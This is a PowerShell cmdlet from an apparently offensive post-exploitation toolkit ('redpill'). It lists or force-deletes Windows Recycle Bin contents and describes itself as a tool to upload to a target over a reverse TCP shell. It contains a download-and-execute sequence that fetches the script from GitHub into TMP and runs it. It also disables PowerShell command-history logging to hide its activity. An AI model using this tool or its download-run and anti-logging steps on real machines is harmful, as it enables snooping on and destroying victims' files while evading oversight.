<#
.SYNOPSIS
   List\Delete the contents of the recycle bin folder.

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: none
   Optional Dependencies: Clear-RecycleBin
   PS cmdlet Dev version: v1.1.4

.DESCRIPTION
   List\Delete the contents of the recycle bin folder.
   This cmdlet can be uploaded to target system trougth our
   reverse tcp shell and used to remote manage recycle bin items.
   
   $Url = "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/list-recycle-bin.ps1"
   iwr -Uri "$Url" -OutFile "$Env:TMP\list-recycle-bin.ps1"
   powershell -File "$Env:TMP\list-recycle-bin.ps1"

.Parameter Exclude
   Exclude from query file types (default: .lock|.etl|.ini)

.Parameter Clean
   Delete all recycle bin items? (default: false)

.EXAMPLE
   PS C:\> .\list-recycle-bin.ps1
   List all recycle bin items

.EXAMPLE
   PS C:\> .\list-recycle-bin.ps1 -Exclude ".tmp"
   List recycle bin items except '.tmp' file types

.EXAMPLE
   PS C:\> .\list-recycle-bin.ps1 -Clean True
   Delete all recycle bin items (recursive)

.OUTPUTS
   Size Name            Type              
   ---- ----            ----              
      0 aria-debug-7552 Documento de texto
      7 passwords       Documento de texto
    146 xxXporno        Pasta de ficheiros

.LINK
   https://github.com/r00t-3xp10it/redpill/blob/main/bin/list-recycle-bin.ps1
#>


#CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Exclude=".lock|.etl|.ini",
   [string]$Clean="false"
)


Write-Host "`n"
$datadump = $null
$FileType = $Exclude -replace '.',''
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null


$datadump = (New-Object -ComObject Shell.Application).NameSpace(0x0a).Items() | Select-Object * | Where-Object {
   $_.Path -iNotMatch "($Exclude)$" -or $_.Type -iNotMatch "($FileType)$"
} | Select-Object Size,Name,Type | Format-Table -AutoSize


If(-not($datadump) -or $datadump -ieq $null)
{
   Write-Host "Error: none items found inside recycle bin .." -ForegroundColor Red -BackgroundColor Black
   Write-Host "";Exit #Exit @list-recycle-bin 
}
Else
{
   If($Clean -ieq "True")
   {
      If(-not(Get-Command "Clear-RecycleBin" -EA SilentlyContinue))
      {
         Write-Host "Error: 'Clear-RecycleBin' command not found .." -ForegroundColor Red -BackGroundColor Black
         Write-Host "None items have been deleted from recycle bin.`n" -ForegroundColor Green
         Exit #Exit @list-recycle-bin         
      }
   
      Clear-RecycleBin -Force|Out-Null
      #Delete all recycle bin items (and count how many items)
      $CountDeletedLines = ($datadump | Measure-Object -Line).Lines
      Write-Host "* Successful deleted '$CountDeletedLines' items from recycle bin.`n" -ForegroundColor Green  
      Exit #Exit @list-recycle-bin
   }

   #Display output Table OnScreen
   echo $datadump | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {
      $stringformat = If($_ -iMatch 'Size+\s')
      {
         @{ 'ForegroundColor' = 'Green' }
      }
      Else
      {
         @{ 'ForegroundColor' = 'White' }
      }
      Write-Host @stringformat $_
   }
}